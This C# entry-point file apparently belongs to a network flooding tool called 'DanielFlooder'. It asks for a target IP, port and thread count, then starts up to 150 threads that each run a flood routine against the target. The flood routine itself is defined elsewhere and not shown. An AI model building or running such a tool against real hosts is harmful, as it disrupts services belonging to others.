using DanielFlooder.Clases;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DanielFlooder
{
    class Program
    {
        public static string TempIP = string.Empty;
        static string TempThreadsNumbers = string.Empty;
        public static string TempPort;
        public static int Port;
        static int Threds;
        static IPAddress IP;
       [STAThread]
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(ConsoleSettings.WelcomeTitle);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("WELCOME TO THE SYSTEM | THIS PROGRAM WAS DEV by Daniel25A#0001");
            Console.Title = ConsoleSettings.ConsoleTitle;
            while(!IPAddress.TryParse(TempIP, out IP) || (!int.TryParse(TempThreadsNumbers,out Threds) || Threds > 150) || !int.TryParse(TempPort, out Port))
            {
                if (TempIP != string.Empty) Console.WriteLine(ConsoleSettings.MsgInvalidIP);
                if (TempThreadsNumbers != string.Empty && Threds != default(int)) Console.WriteLine(ConsoleSettings.MsgInvalidThredNumbers);
                if (TempPort != string.Empty && Port != default(int)) Console.WriteLine(ConsoleSettings.MsgInvalidPort);
                Console.Write(ConsoleSettings.MsgEnterIP); TempIP = Console.ReadLine();
                Console.Write(ConsoleSettings.MsgEnterThreads); TempThreadsNumbers = Console.ReadLine();
                Console.Write(ConsoleSettings.MsgEnterPort);TempPort = Console.ReadLine();
            }
           
            for (int i = 0; i <Threds ; i++)
            {
                Core.Procesos.Add(new Thread(() => new Flooder(new Config() { IP = IP, Port = Port }).DoFlood()));
            }
            Console.ForegroundColor = ConsoleColor.DarkRed;
            foreach (var _process in Core.Procesos)
                _process.Start();
       
            Console.ReadKey(true);
        }
    }
}
